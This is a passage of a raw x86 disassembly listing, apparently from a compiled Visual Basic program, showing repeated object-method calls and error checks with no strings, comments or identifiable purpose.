  40502c:	e9 de ee ff ff       	jmp    0x403f0f
  405031:	8b 16                	mov    (%esi),%edx
  405033:	56                   	push   %esi
  405034:	ff 92 04 03 00 00    	call   *0x304(%edx)
  40503a:	50                   	push   %eax
  40503b:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40503e:	50                   	push   %eax
  40503f:	ff d3                	call   *%ebx
  405041:	8b 0e                	mov    (%esi),%ecx
  405043:	56                   	push   %esi
  405044:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40504a:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  405050:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  405053:	50                   	push   %eax
  405054:	52                   	push   %edx
  405055:	ff d3                	call   *%ebx
  405057:	8b 08                	mov    (%eax),%ecx
  405059:	8d 55 dc             	lea    -0x24(%ebp),%edx
  40505c:	52                   	push   %edx
  40505d:	50                   	push   %eax
  40505e:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  405064:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  40506a:	85 c0                	test   %eax,%eax
  40506c:	db e2                	fnclex
  40506e:	7d 18                	jge    0x405088
  405070:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  405076:	68 a0 00 00 00       	push   $0xa0
  40507b:	68 b8 24 40 00       	push   $0x4024b8
  405080:	51                   	push   %ecx
  405081:	50                   	push   %eax
  405082:	ff 15 28 10 40 00    	call   *0x401028
  405088:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40508b:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  405091:	89 45 98             	mov    %eax,-0x68(%ebp)
  405094:	b8 08 00 00 00       	mov    $0x8,%eax
  405099:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  40509c:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4050a3:	89 45 90             	mov    %eax,-0x70(%ebp)
  4050a6:	c7 85 58 ff ff ff 30 	movl   $0x402730,-0xa8(%ebp)
  4050ad:	27 40 00 
  4050b0:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  4050b6:	ff 15 ac 10 40 00    	call   *0x4010ac
  4050bc:	c7 85 68 ff ff ff 28 	movl   $0x402728,-0x98(%ebp)
  4050c3:	27 40 00 
  4050c6:	8d 95 60 ff ff ff    	lea    -0xa0(%ebp),%edx
  4050cc:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4050cf:	c7 85 60 ff ff ff 08 	movl   $0x8,-0xa0(%ebp)
  4050d6:	00 00 00 
  4050d9:	ff 15 ac 10 40 00    	call   *0x4010ac
  4050df:	33 d2                	xor    %edx,%edx
  4050e1:	81 ff 00 80 ff ff    	cmp    $0xffff8000,%edi
  4050e7:	0f 94 c2             	sete   %dl
  4050ea:	f7 da                	neg    %edx
  4050ec:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4050ef:	66 89 95 78 ff ff ff 	mov    %dx,-0x88(%ebp)
  4050f6:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4050f9:	50                   	push   %eax
  4050fa:	8d 95 70 ff ff ff    	lea    -0x90(%ebp),%edx
  405100:	51                   	push   %ecx
  405101:	8d 45 a0             	lea    -0x60(%ebp),%eax
  405104:	52                   	push   %edx
  405105:	50                   	push   %eax
  405106:	c7 85 70 ff ff ff 0b 	movl   $0xb,-0x90(%ebp)
  40510d:	00 00 00 
  405110:	ff 15 98 10 40 00    	call   *0x401098
  405116:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  40511c:	8d 55 90             	lea    -0x70(%ebp),%edx
  40511f:	8d 45 a0             	lea    -0x60(%ebp),%eax
  405122:	52                   	push   %edx
  405123:	8b 39                	mov    (%ecx),%edi
  405125:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  405128:	50                   	push   %eax
  405129:	51                   	push   %ecx
  40512a:	ff 15 7c 10 40 00    	call   *0x40107c
  405130:	8d 55 d8             	lea    -0x28(%ebp),%edx
  405133:	50                   	push   %eax
  405134:	52                   	push   %edx
  405135:	ff 15 78 10 40 00    	call   *0x401078
  40513b:	50                   	push   %eax
  40513c:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  405142:	50                   	push   %eax
  405143:	ff 97 a4 00 00 00    	call   *0xa4(%edi)
  405149:	85 c0                	test   %eax,%eax
  40514b:	db e2                	fnclex
  40514d:	0f 8d 84 ef ff ff    	jge    0x4040d7
  405153:	e9 67 ef ff ff       	jmp    0x4040bf
  405158:	8b 0e                	mov    (%esi),%ecx
  40515a:	56                   	push   %esi
  40515b:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  405161:	8d 55 d0             	lea    -0x30(%ebp),%edx
  405164:	50                   	push   %eax
  405165:	52                   	push   %edx
  405166:	ff d3                	call   *%ebx
  405168:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40516e:	8b 06                	mov    (%esi),%eax
  405170:	56                   	push   %esi
  405171:	ff 90 04 03 00 00    	call   *0x304(%eax)
  405177:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40517a:	50                   	push   %eax
  40517b:	51                   	push   %ecx
  40517c:	ff d3                	call   *%ebx
  40517e:	8b 10                	mov    (%eax),%edx
  405180:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405183:	51                   	push   %ecx
  405184:	50                   	push   %eax
  405185:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  40518b:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  405191:	85 c0                	test   %eax,%eax
  405193:	db e2                	fnclex
  405195:	7d 18                	jge    0x4051af
  405197:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  40519d:	68 a0 00 00 00       	push   $0xa0
  4051a2:	68 b8 24 40 00       	push   $0x4024b8
  4051a7:	52                   	push   %edx
  4051a8:	50                   	push   %eax
  4051a9:	ff 15 28 10 40 00    	call   *0x401028
  4051af:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4051b2:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  4051b8:	89 45 98             	mov    %eax,-0x68(%ebp)
  4051bb:	b8 08 00 00 00       	mov    $0x8,%eax
  4051c0:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4051c3:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4051ca:	89 45 90             	mov    %eax,-0x70(%ebp)
  4051cd:	c7 85 58 ff ff ff 40 	movl   $0x402740,-0xa8(%ebp)
  4051d4:	27 40 00 
  4051d7:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  4051dd:	ff 15 ac 10 40 00    	call   *0x4010ac
  4051e3:	c7 85 68 ff ff ff 38 	movl   $0x402738,-0x98(%ebp)
  4051ea:	27 40 00 
  4051ed:	e9 1d ed ff ff       	jmp    0x403f0f
  4051f2:	8b 16                	mov    (%esi),%edx
  4051f4:	56                   	push   %esi
  4051f5:	ff 92 04 03 00 00    	call   *0x304(%edx)
  4051fb:	50                   	push   %eax
  4051fc:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4051ff:	50                   	push   %eax
  405200:	ff d3                	call   *%ebx
  405202:	8b 0e                	mov    (%esi),%ecx
  405204:	56                   	push   %esi
  405205:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40520b:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  405211:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  405214:	50                   	push   %eax
  405215:	52                   	push   %edx
  405216:	ff d3                	call   *%ebx
  405218:	8b 08                	mov    (%eax),%ecx
  40521a:	8d 55 dc             	lea    -0x24(%ebp),%edx
  40521d:	52                   	push   %edx
  40521e:	50                   	push   %eax
  40521f:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  405225:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  40522b:	85 c0                	test   %eax,%eax
  40522d:	db e2                	fnclex
  40522f:	7d 18                	jge    0x405249
  405231:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  405237:	68 a0 00 00 00       	push   $0xa0
  40523c:	68 b8 24 40 00       	push   $0x4024b8
  405241:	51                   	push   %ecx
  405242:	50                   	push   %eax
  405243:	ff 15 28 10 40 00    	call   *0x401028
  405249:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40524c:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  405252:	89 45 98             	mov    %eax,-0x68(%ebp)
  405255:	b8 08 00 00 00       	mov    $0x8,%eax
  40525a:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  40525d:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  405264:	89 45 90             	mov    %eax,-0x70(%ebp)
  405267:	c7 85 58 ff ff ff 50 	movl   $0x402750,-0xa8(%ebp)
  40526e:	27 40 00 
  405271:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  405277:	ff 15 ac 10 40 00    	call   *0x4010ac
  40527d:	8d 95 60 ff ff ff    	lea    -0xa0(%ebp),%edx
  405283:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  405286:	c7 85 68 ff ff ff 48 	movl   $0x402748,-0x98(%ebp)
  40528d:	27 40 00 
  405290:	c7 85 60 ff ff ff 08 	movl   $0x8,-0xa0(%ebp)
  405297:	00 00 00 
  40529a:	ff 15 ac 10 40 00    	call   *0x4010ac
  4052a0:	33 d2                	xor    %edx,%edx
  4052a2:	81 ff 00 80 ff ff    	cmp    $0xffff8000,%edi
  4052a8:	0f 94 c2             	sete   %dl
  4052ab:	f7 da                	neg    %edx
  4052ad:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4052b0:	66 89 95 78 ff ff ff 	mov    %dx,-0x88(%ebp)
  4052b7:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4052ba:	50                   	push   %eax
  4052bb:	8d 95 70 ff ff ff    	lea    -0x90(%ebp),%edx
  4052c1:	51                   	push   %ecx
  4052c2:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4052c5:	52                   	push   %edx
  4052c6:	50                   	push   %eax
  4052c7:	c7 85 70 ff ff ff 0b 	movl   $0xb,-0x90(%ebp)
  4052ce:	00 00 00 
  4052d1:	ff 15 98 10 40 00    	call   *0x401098
  4052d7:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  4052dd:	8d 55 90             	lea    -0x70(%ebp),%edx
  4052e0:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4052e3:	52                   	push   %edx
  4052e4:	8b 39                	mov    (%ecx),%edi
  4052e6:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  4052e9:	50                   	push   %eax
  4052ea:	51                   	push   %ecx
  4052eb:	ff 15 7c 10 40 00    	call   *0x40107c
  4052f1:	8d 55 d8             	lea    -0x28(%ebp),%edx
  4052f4:	50                   	push   %eax
  4052f5:	52                   	push   %edx
  4052f6:	ff 15 78 10 40 00    	call   *0x401078
  4052fc:	50                   	push   %eax
  4052fd:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  405303:	50                   	push   %eax
  405304:	ff 97 a4 00 00 00    	call   *0xa4(%edi)
  40530a:	85 c0                	test   %eax,%eax
  40530c:	db e2                	fnclex
  40530e:	7d 18                	jge    0x405328
  405310:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  405316:	68 a4 00 00 00       	push   $0xa4
  40531b:	68 b8 24 40 00       	push   $0x4024b8
  405320:	51                   	push   %ecx
  405321:	50                   	push   %eax
  405322:	ff 15 28 10 40 00    	call   *0x401028
  405328:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40532b:	ff 15 cc 10 40 00    	call   *0x4010cc
  405331:	8d 55 d0             	lea    -0x30(%ebp),%edx
  405334:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  405337:	52                   	push   %edx
  405338:	50                   	push   %eax
  405339:	6a 02                	push   $0x2
  40533b:	ff 15 18 10 40 00    	call   *0x401018
  405341:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  405344:	8d 55 a0             	lea    -0x60(%ebp),%edx
  405347:	51                   	push   %ecx
  405348:	8d 45 90             	lea    -0x70(%ebp),%eax
  40534b:	52                   	push   %edx
  40534c:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  40534f:	50                   	push   %eax
  405350:	8d 55 c0             	lea    -0x40(%ebp),%edx
  405353:	51                   	push   %ecx
  405354:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  40535a:	52                   	push   %edx
  40535b:	50                   	push   %eax
  40535c:	6a 06                	push   $0x6
  40535e:	ff 15 10 10 40 00    	call   *0x401010
  405364:	83 c4 28             	add    $0x28,%esp
  405367:	e9 4c 0d 00 00       	jmp    0x4060b8
  40536c:	8b 0e                	mov    (%esi),%ecx
  40536e:	56                   	push   %esi
  40536f:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  405375:	8d 55 d0             	lea    -0x30(%ebp),%edx
  405378:	50                   	push   %eax
  405379:	52                   	push   %edx
  40537a:	ff d3                	call   *%ebx
  40537c:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405382:	8b 06                	mov    (%esi),%eax
  405384:	56                   	push   %esi
  405385:	ff 90 04 03 00 00    	call   *0x304(%eax)
  40538b:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40538e:	50                   	push   %eax
  40538f:	51                   	push   %ecx
  405390:	ff d3                	call   *%ebx
  405392:	8b 10                	mov    (%eax),%edx
  405394:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405397:	51                   	push   %ecx
  405398:	50                   	push   %eax
  405399:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  40539f:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  4053a5:	85 c0                	test   %eax,%eax
  4053a7:	db e2                	fnclex
  4053a9:	7d 18                	jge    0x4053c3
  4053ab:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  4053b1:	68 a0 00 00 00       	push   $0xa0
  4053b6:	68 b8 24 40 00       	push   $0x4024b8
  4053bb:	52                   	push   %edx
  4053bc:	50                   	push   %eax
  4053bd:	ff 15 28 10 40 00    	call   *0x401028
  4053c3:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4053c6:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  4053cc:	89 45 98             	mov    %eax,-0x68(%ebp)
  4053cf:	b8 08 00 00 00       	mov    $0x8,%eax
  4053d4:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4053d7:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4053de:	89 45 90             	mov    %eax,-0x70(%ebp)
  4053e1:	c7 85 58 ff ff ff 60 	movl   $0x402760,-0xa8(%ebp)
  4053e8:	27 40 00 
  4053eb:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  4053f1:	ff 15 ac 10 40 00    	call   *0x4010ac
  4053f7:	8d 95 60 ff ff ff    	lea    -0xa0(%ebp),%edx
  4053fd:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  405400:	c7 85 68 ff ff ff 58 	movl   $0x402758,-0x98(%ebp)
  405407:	27 40 00 
  40540a:	c7 85 60 ff ff ff 08 	movl   $0x8,-0xa0(%ebp)
  405411:	00 00 00 
  405414:	ff 15 ac 10 40 00    	call   *0x4010ac
  40541a:	33 c0                	xor    %eax,%eax
  40541c:	81 ff 00 80 ff ff    	cmp    $0xffff8000,%edi
  405422:	0f 94 c0             	sete   %al
  405425:	f7 d8                	neg    %eax
  405427:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  40542a:	66 89 85 78 ff ff ff 	mov    %ax,-0x88(%ebp)
  405431:	8d 55 c0             	lea    -0x40(%ebp),%edx
  405434:	51                   	push   %ecx
  405435:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  40543b:	52                   	push   %edx
  40543c:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  40543f:	50                   	push   %eax
  405440:	51                   	push   %ecx
  405441:	c7 85 70 ff ff ff 0b 	movl   $0xb,-0x90(%ebp)
  405448:	00 00 00 
  40544b:	ff 15 98 10 40 00    	call   *0x401098
  405451:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  405457:	8d 45 90             	lea    -0x70(%ebp),%eax
  40545a:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  40545d:	50                   	push   %eax
  40545e:	8b 3a                	mov    (%edx),%edi
  405460:	8d 55 80             	lea    -0x80(%ebp),%edx
  405463:	51                   	push   %ecx
  405464:	52                   	push   %edx
  405465:	ff 15 7c 10 40 00    	call   *0x40107c
  40546b:	50                   	push   %eax
  40546c:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40546f:	50                   	push   %eax
  405470:	ff 15 78 10 40 00    	call   *0x401078
  405476:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  40547c:	50                   	push   %eax
  40547d:	51                   	push   %ecx
  40547e:	ff 97 a4 00 00 00    	call   *0xa4(%edi)
  405484:	85 c0                	test   %eax,%eax
  405486:	db e2                	fnclex
  405488:	7d 18                	jge    0x4054a2
  40548a:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  405490:	68 a4 00 00 00       	push   $0xa4
  405495:	68 b8 24 40 00       	push   $0x4024b8
  40549a:	52                   	push   %edx
  40549b:	50                   	push   %eax
  40549c:	ff 15 28 10 40 00    	call   *0x401028
  4054a2:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4054a5:	ff 15 cc 10 40 00    	call   *0x4010cc
  4054ab:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4054ae:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4054b1:	50                   	push   %eax
  4054b2:	51                   	push   %ecx
  4054b3:	6a 02                	push   $0x2
  4054b5:	ff 15 18 10 40 00    	call   *0x401018
  4054bb:	8d 55 80             	lea    -0x80(%ebp),%edx
  4054be:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4054c1:	52                   	push   %edx
  4054c2:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  4054c5:	50                   	push   %eax
  4054c6:	8d 55 b0             	lea    -0x50(%ebp),%edx
  4054c9:	51                   	push   %ecx
  4054ca:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4054cd:	52                   	push   %edx
  4054ce:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  4054d4:	50                   	push   %eax
  4054d5:	51                   	push   %ecx
  4054d6:	6a 06                	push   $0x6
  4054d8:	ff 15 10 10 40 00    	call   *0x401010
  4054de:	83 c4 28             	add    $0x28,%esp
  4054e1:	e9 d2 0b 00 00       	jmp    0x4060b8
  4054e6:	8b 16                	mov    (%esi),%edx
  4054e8:	56                   	push   %esi
  4054e9:	ff 92 04 03 00 00    	call   *0x304(%edx)
  4054ef:	50                   	push   %eax
  4054f0:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4054f3:	50                   	push   %eax
  4054f4:	ff d3                	call   *%ebx
  4054f6:	8b 0e                	mov    (%esi),%ecx
  4054f8:	56                   	push   %esi
  4054f9:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4054ff:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  405505:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  405508:	50                   	push   %eax
  405509:	52                   	push   %edx
  40550a:	ff d3                	call   *%ebx
  40550c:	8b f8                	mov    %eax,%edi
  40550e:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405511:	51                   	push   %ecx
  405512:	57                   	push   %edi
  405513:	8b 07                	mov    (%edi),%eax
  405515:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  40551b:	85 c0                	test   %eax,%eax
  40551d:	db e2                	fnclex
  40551f:	7d 12                	jge    0x405533
  405521:	68 a0 00 00 00       	push   $0xa0
  405526:	68 b8 24 40 00       	push   $0x4024b8
  40552b:	57                   	push   %edi
  40552c:	50                   	push   %eax
  40552d:	ff 15 28 10 40 00    	call   *0x401028
  405533:	8b 45 dc             	mov    -0x24(%ebp),%eax
  405536:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  40553c:	50                   	push   %eax
  40553d:	68 68 27 40 00       	push   $0x402768
  405542:	8b 3a                	mov    (%edx),%edi
  405544:	ff 15 20 10 40 00    	call   *0x401020
  40554a:	8b d0                	mov    %eax,%edx
  40554c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40554f:	ff 15 b8 10 40 00    	call   *0x4010b8
  405555:	8b cf                	mov    %edi,%ecx
  405557:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  40555d:	50                   	push   %eax
  40555e:	57                   	push   %edi
  40555f:	e9 13 09 00 00       	jmp    0x405e77
  405564:	8b 06                	mov    (%esi),%eax
  405566:	56                   	push   %esi
  405567:	ff 90 04 03 00 00    	call   *0x304(%eax)
  40556d:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  405570:	50                   	push   %eax
  405571:	51                   	push   %ecx
  405572:	ff d3                	call   *%ebx
  405574:	8b 16                	mov    (%esi),%edx
  405576:	56                   	push   %esi
  405577:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40557d:	ff 92 04 03 00 00    	call   *0x304(%edx)
  405583:	50                   	push   %eax
  405584:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  405587:	50                   	push   %eax
  405588:	ff d3                	call   *%ebx
  40558a:	8b f8                	mov    %eax,%edi
  40558c:	8d 55 dc             	lea    -0x24(%ebp),%edx
  40558f:	52                   	push   %edx
  405590:	57                   	push   %edi
  405591:	8b 0f                	mov    (%edi),%ecx
  405593:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  405599:	85 c0                	test   %eax,%eax
  40559b:	db e2                	fnclex
  40559d:	7d 12                	jge    0x4055b1
  40559f:	68 a0 00 00 00       	push   $0xa0
  4055a4:	68 b8 24 40 00       	push   $0x4024b8
  4055a9:	57                   	push   %edi
  4055aa:	50                   	push   %eax
  4055ab:	ff 15 28 10 40 00    	call   *0x401028
  4055b1:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4055b4:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  4055ba:	51                   	push   %ecx
  4055bb:	68 90 27 40 00       	push   $0x402790
  4055c0:	8b 38                	mov    (%eax),%edi
  4055c2:	ff 15 20 10 40 00    	call   *0x401020
  4055c8:	8b d0                	mov    %eax,%edx
  4055ca:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4055cd:	ff 15 b8 10 40 00    	call   *0x4010b8
  4055d3:	8b d7                	mov    %edi,%edx
  4055d5:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4055db:	50                   	push   %eax
  4055dc:	57                   	push   %edi
  4055dd:	e9 df e0 ff ff       	jmp    0x4036c1
  4055e2:	8b 0e                	mov    (%esi),%ecx
  4055e4:	56                   	push   %esi
  4055e5:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  4055eb:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4055ee:	50                   	push   %eax
  4055ef:	52                   	push   %edx
  4055f0:	ff d3                	call   *%ebx
  4055f2:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4055f8:	8b 06                	mov    (%esi),%eax
  4055fa:	56                   	push   %esi
  4055fb:	ff 90 04 03 00 00    	call   *0x304(%eax)
  405601:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  405604:	50                   	push   %eax
  405605:	51                   	push   %ecx
  405606:	ff d3                	call   *%ebx
  405608:	8b f8                	mov    %eax,%edi
  40560a:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40560d:	50                   	push   %eax
  40560e:	57                   	push   %edi
  40560f:	8b 17                	mov    (%edi),%edx
  405611:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  405617:	85 c0                	test   %eax,%eax
  405619:	db e2                	fnclex
  40561b:	7d 12                	jge    0x40562f
  40561d:	68 a0 00 00 00       	push   $0xa0
  405622:	68 b8 24 40 00       	push   $0x4024b8
  405627:	57                   	push   %edi
  405628:	50                   	push   %eax
  405629:	ff 15 28 10 40 00    	call   *0x401028
  40562f:	8b 55 dc             	mov    -0x24(%ebp),%edx
  405632:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  405638:	52                   	push   %edx
  405639:	68 a8 27 40 00       	push   $0x4027a8
  40563e:	8b 39                	mov    (%ecx),%edi
  405640:	ff 15 20 10 40 00    	call   *0x401020
  405646:	8b d0                	mov    %eax,%edx
  405648:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40564b:	ff 15 b8 10 40 00    	call   *0x4010b8
  405651:	89 bd 3c fe ff ff    	mov    %edi,-0x1c4(%ebp)
  405657:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  40565d:	50                   	push   %eax
  40565e:	8b 85 3c fe ff ff    	mov    -0x1c4(%ebp),%eax
  405664:	57                   	push   %edi
  405665:	e9 ef e0 ff ff       	jmp    0x403759
  40566a:	8b 16                	mov    (%esi),%edx
  40566c:	56                   	push   %esi
  40566d:	ff 92 04 03 00 00    	call   *0x304(%edx)
  405673:	50                   	push   %eax
  405674:	8d 45 d0             	lea    -0x30(%ebp),%eax
  405677:	50                   	push   %eax
  405678:	ff d3                	call   *%ebx
  40567a:	8b 0e                	mov    (%esi),%ecx
  40567c:	56                   	push   %esi
  40567d:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405683:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  405689:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  40568c:	50                   	push   %eax
  40568d:	52                   	push   %edx
  40568e:	ff d3                	call   *%ebx
  405690:	8b f8                	mov    %eax,%edi
  405692:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405695:	51                   	push   %ecx
  405696:	57                   	push   %edi
  405697:	8b 07                	mov    (%edi),%eax
  405699:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  40569f:	85 c0                	test   %eax,%eax
  4056a1:	db e2                	fnclex
  4056a3:	7d 12                	jge    0x4056b7
  4056a5:	68 a0 00 00 00       	push   $0xa0
  4056aa:	68 b8 24 40 00       	push   $0x4024b8
  4056af:	57                   	push   %edi
  4056b0:	50                   	push   %eax
  4056b1:	ff 15 28 10 40 00    	call   *0x401028
  4056b7:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4056ba:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  4056c0:	50                   	push   %eax
  4056c1:	68 c0 27 40 00       	push   $0x4027c0
  4056c6:	8b 3a                	mov    (%edx),%edi
  4056c8:	ff 15 20 10 40 00    	call   *0x401020
  4056ce:	8b d0                	mov    %eax,%edx
  4056d0:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4056d3:	ff 15 b8 10 40 00    	call   *0x4010b8
  4056d9:	8b cf                	mov    %edi,%ecx
  4056db:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4056e1:	50                   	push   %eax
  4056e2:	57                   	push   %edi
  4056e3:	e9 8f 07 00 00       	jmp    0x405e77
  4056e8:	8b 06                	mov    (%esi),%eax
  4056ea:	56                   	push   %esi
  4056eb:	ff 90 04 03 00 00    	call   *0x304(%eax)
  4056f1:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4056f4:	50                   	push   %eax
  4056f5:	51                   	push   %ecx
  4056f6:	ff d3                	call   *%ebx
  4056f8:	8b 16                	mov    (%esi),%edx
  4056fa:	56                   	push   %esi
  4056fb:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405701:	ff 92 04 03 00 00    	call   *0x304(%edx)
  405707:	50                   	push   %eax
  405708:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40570b:	50                   	push   %eax
  40570c:	ff d3                	call   *%ebx
  40570e:	8b f8                	mov    %eax,%edi
  405710:	8d 55 dc             	lea    -0x24(%ebp),%edx
  405713:	52                   	push   %edx
  405714:	57                   	push   %edi
  405715:	8b 0f                	mov    (%edi),%ecx
  405717:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  40571d:	85 c0                	test   %eax,%eax
  40571f:	db e2                	fnclex
  405721:	7d 12                	jge    0x405735
  405723:	68 a0 00 00 00       	push   $0xa0
  405728:	68 b8 24 40 00       	push   $0x4024b8
  40572d:	57                   	push   %edi
  40572e:	50                   	push   %eax
  40572f:	ff 15 28 10 40 00    	call   *0x401028
  405735:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  405738:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  40573e:	51                   	push   %ecx
  40573f:	68 d8 27 40 00       	push   $0x4027d8
  405744:	8b 38                	mov    (%eax),%edi
  405746:	ff 15 20 10 40 00    	call   *0x401020
  40574c:	8b d0                	mov    %eax,%edx
  40574e:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405751:	ff 15 b8 10 40 00    	call   *0x4010b8
  405757:	8b d7                	mov    %edi,%edx
  405759:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  40575f:	50                   	push   %eax
  405760:	57                   	push   %edi
  405761:	e9 5b df ff ff       	jmp    0x4036c1
  405766:	8b 0e                	mov    (%esi),%ecx
  405768:	56                   	push   %esi
  405769:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  40576f:	8d 55 d0             	lea    -0x30(%ebp),%edx
  405772:	50                   	push   %eax
  405773:	52                   	push   %edx
  405774:	ff d3                	call   *%ebx
  405776:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40577c:	8b 06                	mov    (%esi),%eax
  40577e:	56                   	push   %esi
